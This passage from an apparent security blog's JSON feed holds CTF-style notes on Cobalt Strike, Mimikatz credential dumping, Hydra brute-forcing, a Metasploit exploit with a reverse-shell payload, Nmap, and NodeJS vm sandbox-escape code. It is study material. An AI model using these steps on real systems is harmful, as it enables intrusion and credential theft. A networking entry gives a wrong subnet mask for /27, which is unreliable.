class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>└─# cat ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile         </pre></td></tr><tr><td data-num=\"10\"></td><td><pre># ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile<span class=\"token punctuation\">:</span> executed by Bourne<span class=\"token operator\">-</span>compatible login shells<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">\"$BASH\"</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> then</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token operator\">-</span>f ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>bashrc <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> then</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">.</span> ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>bashrc</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  fi</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>mesg n <span class=\"token operator\">||</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>export PATH<span class=\"token operator\">=</span>$PATH<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token keyword\">go</span><span class=\"token operator\">/</span>bin</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>source ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">go</span> env 查看环境变量</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">go</span> env <span class=\"token operator\">-</span>w GO111MODULE<span class=\"token operator\">=</span>on</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">go</span> env <span class=\"token operator\">-</span>w GOPROXY<span class=\"token operator\">=</span>https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>goproxy<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">,</span>direct</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">go</span> mod tidy</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">go</span> build <span class=\"token operator\">-</span>ldflags<span class=\"token operator\">=</span><span class=\"token string\">\"-s -w \"</span> <span class=\"token operator\">-</span>trimpath main<span class=\"token punctuation\">.</span><span class=\"token keyword\">go</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>main <span class=\"token operator\">-</span>h <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.128</span></pre></td></tr></table></figure><h1 id=\"cobalt-strike\"><a class=\"anchor\" href=\"#cobalt-strike\">#</a> Cobalt Strike</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYwNTcxODQyL2FydGljbGUvZGV0YWlscy8xMzI5MjA2NzI=\">CobaltStrike4.8 汉化版带插件_cobaltstrike 下载 - CSDN 博客</span></p>\n<p>[【渗透测试笔记】之【内网渗透 —— 横向移动：PsExec 的使用】_横向渗透 psexec-CSDN 博客](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODc0NjQ1L2FydGljbGUvZGV0YWlscy8xMjEzOTQ2NzgjOn46dGV4dD1DUyVFNCVCOCVBRCVFNyU5QSU4NFBzRXhlYw==\">https://blog.csdn.net/qq_44874645/article/details/121394678#:~:text=CS 中的 PsExec</span> 2.1 查看目标所在网段其它主机 扫描主机 列出主机，2.2 使用 PsExec 横向移动 右键要横向的目标主机，选择 psexec 的版本（32 位 64 位或 PowerShell）。 选择已经获得的凭据（明文、散列值、令牌都可以）、回连的 listener、进行横向的 session。 点击 Launch，即会返回一个 DC-1 的 session。)</p>\n<p>xftp 上传 server 文件夹（需要 ssh 服务）</p>\n<p>KALI 服务端部署</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span>  cs //当前目录建一个cs目录 存放cs文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> cs</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">chmod</span> a+x ./teamserver  给权限</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">ifconfig</span> //查看本机IP地址 要与客户机ping得通  才可以连接</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>./teamserver <span class=\"token number\">192.168</span>.57.128 <span class=\"token number\">123456</span>  //本机ip+密码-密码随便设置</pre></td></tr></table></figure><p>Windows 客户端部署</p>\n<p>双击 client 文件夹下的 Cobalt_Strike_CN.vbs，连接时用 kali 的 ip 地址，监听器设置的也是 kali，生成木马运行后会自动获取受害机 ip</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sleep</span> <span class=\"token number\">3</span> 全部命令3秒执行<span class=\"token punctuation\">(</span>默认时60秒太长，<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>执行系统命令要在命令前加个  shell <span class=\"token function\">whoami</span></pre></td></tr></table></figure><h2 id=\"mimikatz\"><a class=\"anchor\" href=\"#mimikatz\">#</a> Mimikatz</h2>\n<p>提取 windows 凭据的密码</p>\n<p>管理员身份执行： <code>logonpasswords</code></p>\n<h2 id=\"psexec\"><a class=\"anchor\" href=\"#psexec\">#</a> PSexec</h2>\n<h1 id=\"rips\"><a class=\"anchor\" href=\"#rips\">#</a> RIPS</h1>\n<p>PHP 代码审计</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjUxNTU4OC9hcnRpY2xlL2RldGFpbHMvMTIzOTY1NzQ0\">https://blog.csdn.net/weixin_52515588/article/details/123965744</span></p>\n<h1 id=\"fortify\"><a class=\"anchor\" href=\"#fortify\">#</a> Fortify</h1>\n<p>代码审计软件</p>\n<ol>\n<li>把 <code>fortify.license</code>  和 <code>Fortify_SCA_23.1.0_windows_x64.exe</code> 、 <code>Fortify_Apps_and_Tools_23.1.0_windows_x64.exe</code> <br />\n 剪贴放在同一目录，不要有中文。</li>\n<li>安装 <code>Fortify_SCA_23.1.0_windows_x64.exe</code>  和 <code>Fortify_Apps_and_Tools_23.1.0_windows_x64.exe</code> ，程序会自动找到 <code>fortify.license</code>  授权文件</li>\n<li>把 <code>fortify-common-23.1.0.0028.jar</code>  分别拷贝到 <code>Fortify\\Fortify_SCA_23.1.0\\Core\\lib\\</code> <br />\n 和 <code>Fortify\\Fortify_Apps_and_Tools_23.1.0\\Core\\lib\\</code>  替换覆盖</li>\n<li>解压 <code>FortifyRules_zh_CH_2023.1.1.0001(离线规则库).zip</code>  规则库，把 <code>ExternalMetadata</code>  和 <code>rules</code>  文件夹拷贝到 <code>Fortify\\Fortify_SCA_23.1.0\\Core\\config</code>  下</li>\n<li>运行 <code>Fortify\\Fortify_Apps_and_Tools_23.1.0\\bin</code>  下的 <code>auditworkbench.cmd</code>  即可开启 GUI 界面</li>\n<li>根据需要配置扫描即可</li>\n<li>规则库：直接本地无法升级规则库，离线升级及最新中英文规则库。</li>\n</ol>\n<h1 id=\"nmap\"><a class=\"anchor\" href=\"#nmap\">#</a> Nmap</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>扫整个网段ip存活情况nmap <span class=\"token operator\">-</span>sP <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>扫描开放端口的服务版本nmap <span class=\"token operator\">-</span>sV <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>单独扫描域名nmap <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>全端口扫描nmap <span class=\"token operator\">-</span>sV <span class=\"token operator\">-</span>p<span class=\"token operator\">-</span> <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>扫描端口服务的详细信息nmap <span class=\"token operator\">-</span>sS <span class=\"token operator\">-</span>sV <span class=\"token operator\">-</span>A <span class=\"token operator\">-</span>T5 <span class=\"token operator\">-</span>p55006<span class=\"token punctuation\">,</span><span class=\"token number\">55007</span> <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr></table></figure><h1 id=\"hydra\"><a class=\"anchor\" href=\"#hydra\">#</a> Hydra</h1>\n<p>九头蛇暴力破解</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo命令两个用户名写入txt文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gedit name<span class=\"token punctuation\">.</span>txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo <span class=\"token operator\">-</span>e <span class=\"token string\">'natalya\\nboris'</span> <span class=\"token operator\">></span> name<span class=\"token punctuation\">.</span>txt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Hydra自带的字典进行密码爆破</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Hydra <span class=\"token operator\">-</span>L name<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>P <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>wordlists<span class=\"token operator\">/</span>fasttrack<span class=\"token punctuation\">.</span>txt <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span> <span class=\"token operator\">-</span>s <span class=\"token number\">55007</span> pop3</pre></td></tr></table></figure><h1 id=\"metasploit\"><a class=\"anchor\" href=\"#metasploit\">#</a> Metasploit</h1>\n<pre><code class=\"language-Python\">msfconsole                        ---进入MSF框架攻击界面\nsearch moodle                     ---查找 moodle这个CMS的攻击的模块\nuse 1(攻击脚本编号)                ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本\nshow options                      ---查看需要填充的变量\nset username admin                ---设置用户名：admin\nset password xWinter1995x!        ---设置密码：xWinter1995x!\nset rhost severnaya-station.com   ---设置：rhosts severnaya-station.com\nset targeturi /gnocertdir         ---设置目录： /gnocertdir\nset payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse（linux内核，Linux是一个                                      类 Unix 操作系统）\nset lhost 192.168.200.131         ---设置：lhost 192.168.200.131（需要本地IP）\nexploit  ----执行命令\n</code></pre>\n<h1 id=\"cewl\"><a class=\"anchor\" href=\"#cewl\">#</a> cewl</h1>\n<p>通过爬行网站获取关键信息创建一个密码字典</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cewl http<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span><span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.136</span><span class=\"token punctuation\">:</span><span class=\"token number\">1898</span><span class=\"token operator\">/</span>?q<span class=\"token operator\">=</span>node<span class=\"token operator\">/</span><span class=\"token number\">1</span> <span class=\"token operator\">-</span>w xxg<span class=\"token punctuation\">.</span>txt</pre></td></tr></table></figure><h1 id=\"proxychains\"><a class=\"anchor\" href=\"#proxychains\">#</a> proxychains</h1>\n<p>CentOS</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>yum <span class=\"token function\">install</span> epel-release</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> proxychains-ng</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">vi</span> /etc/proxychains.conf</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 将 socks4 127.0.0.1 9095 改为香港 / 国外代理服务器 ip port</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 虚拟机使用，连接物理机代理，将 127.0.0.1 换为本机 WLAN IPv4 地址即可</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>socks5 <span class=\"token number\">127.0</span>.0.1 <span class=\"token number\">10808</span></pre></td></tr></table></figure><h1 id=\"ciphey\"><a class=\"anchor\" href=\"#ciphey\">#</a> Ciphey</h1>\n<p>Ciphey 不适用于使用 Python 3.9+ 的 Windows，请使用 Python 3.7 或 Python 3.8。其他平台使用 Python 3.9 没问题，Python 3.10 不行。</p>\n<p><strong>Windows</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-m</span> pip <span class=\"token function\">install</span> <span class=\"token parameter variable\">-U</span> pip</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pip <span class=\"token function\">install</span> <span class=\"token parameter variable\">--upgrade</span> setuptools</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>python <span class=\"token parameter variable\">-m</span> pip <span class=\"token function\">install</span> <span class=\"token parameter variable\">-U</span> ciphey</pre></td></tr></table></figure><p><strong>Linux</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pip3 <span class=\"token function\">install</span> <span class=\"token parameter variable\">-U</span> pip</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python3 <span class=\"token parameter variable\">-m</span> pip <span class=\"token function\">install</span> ciphey <span class=\"token parameter variable\">--upgrade</span></pre></td></tr></table></figure><h1 id=\"httpx\"><a class=\"anchor\" href=\"#httpx\">#</a> httpx</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>proxychains   go <span class=\"token function\">install</span> <span class=\"token parameter variable\">-v</span> github.com/projectdiscovery/httpx/cmd/httpx@latest</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>httpx <span class=\"token parameter variable\">-h</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># httpx   </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Usage: httpx [OPTIONS] URL</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># Error: Missing argument 'URL'.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>因为kali中存在httpx和另一个python库httpx</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>go env查看<span class=\"token variable\">$GOPATH</span>路径</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">cd</span> <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /root/go/bin</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>./httpx</pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/",
            "url": "http://yoursite.com/Web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/",
            "title": "计算机网络基础",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"子网掩码\"><a class=\"anchor\" href=\"#子网掩码\">#</a> 子网掩码</h1>\n<p>二进制换算成十六进制</p>\n<p><code>11111111.11111111.11111111.00000000(网络号)(主机号)</code></p>\n<p>C 网默认的子网掩码是： <code>255.255.255.0</code></p>\n<p><code>192.168.1.53/27</code>  对应的子网掩码是 <code>255.255.255.254</code></p>\n<p><code>11111111.11111111.11111111.11100000(网络号)(主机号)</code></p>\n<p>网络号向主机号借了 3 位（27-24）, 子网有 8 个，最大容纳主机数 32 个 (0 的个数)</p>\n<h1 id=\"cmd\"><a class=\"anchor\" href=\"#cmd\">#</a> cmd</h1>\n<p><code>ncpa.cpl</code>   打开网络适配器设置</p>\n<h1 id=\"查本机ip\"><a class=\"anchor\" href=\"#查本机ip\">#</a> 查本机 IP</h1>\n<p><strong>外网 IP</strong></p>\n<ul>\n<li>\n<p>浏览器输入 <code>ip.3322.org</code></p>\n</li>\n<li>\n<p><code>cmd</code>  输入 <code>curl ipinfo.io</code></p>\n</li>\n</ul>\n<p><strong>内网 IP</strong></p>\n<p>看网卡 <code>IPv4</code>  地址</p>\n",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/",
            "title": "沙箱逃逸漏洞总结",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"nodejs\"><a class=\"anchor\" href=\"#nodejs\">#</a> NodeJS</h1>\n<p><code>JavaScript -&gt; 浏览器，前端</code></p>\n<p><code>NodeJS -&gt; 用Chrome中的v8引擎为Javascript开发的运行环境，后端</code></p>\n<ul>\n<li><code>沙箱sandbox</code> ：运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li>\n<li><code>虚拟机VM</code> ：实现一台电脑上使用多个操作系统</li>\n<li><code>容器Docker</code> ：sandbox 的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用 Docker 和 sandbox 嵌套的方式更多一点，安全性也更高。</li>\n</ul>\n<h2 id=\"vm逃逸\"><a class=\"anchor\" href=\"#vm逃逸\">#</a> VM 逃逸</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">NodeJS中将字符串执行为代码</span><span class=\"token punctuation\">(</span>作用域也称上下文，Context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1.</span> eval：在当前作用域下执行</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">2.</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：创建新作用域执行</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">两个不同的js文件，作用域也不同，若想调用对方的变量或函数，则需要exports后再require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>导入</pre></td></tr></table></figure><p>Nodejs 中，我们可以通过引入 <code>vm</code>  模块来创建一个沙箱。</p>\n<p>通过传入字符串在沙箱内执行代码，且该新的作用域与外部隔绝</p>\n<p><strong>常用的 vm 模块 API</strong></p>\n<ul>\n<li><code>vm.runinThisContext(code)</code> ：global 下创建一个 <code>sanbox</code>  作用域，接收到的参数作为代码运行；可以访问 global 中的属性，但无法访问其他包中的属性</li>\n<li><code>vm.createContext([sandbox])</code> ：global 外创建一个 <code>sanbox</code>  作用域，沙箱对象就是这个作用域的全局对象，沙箱内部无法访问 global 中的属性</li>\n<li><code>vm.runInContext(code, contextifiedSandbox[, options])</code></li>\n<li><code>vm.runInNewContext(code, sandbox)</code></li>\n<li><code>vm.Script类</code></li>\n<li><code>new vm.Script(code, options)</code></li>\n</ul>\n<p><strong>逃逸方法</strong></p>\n<p>NodeJS 进行 RCE：获取 process 对象后，用 require 导入 child_process，再利用 child_process 执行命令，process 挂载在 global 上。</p>\n<p>需要将<strong> global 上的 process 引入沙箱</strong>中，才能在 <code>createContext</code>  后进行 RCE</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string\">\"use strict\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vm\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> y1 <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">this.constructor.constructor('return process.env')()</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 返回 process 对象</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>y1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">const</span> y1 <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">this.toString.constructor('return process')()</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"vm2逃逸\"><a class=\"anchor\" href=\"#vm2逃逸\">#</a> VM2 逃逸</h2>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE4NTk/dGltZV9fMTMxMT1tcW14MERCRDlEeUR1QllEJTJGUWJpUVFMRUVXRDg3bERmcnJEJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJG\">NodeJS VM 和 VM2 沙箱逃逸</span></p>\n",
            "tags": [
                "Web",
                "Web"
            ]
        }
    ]
}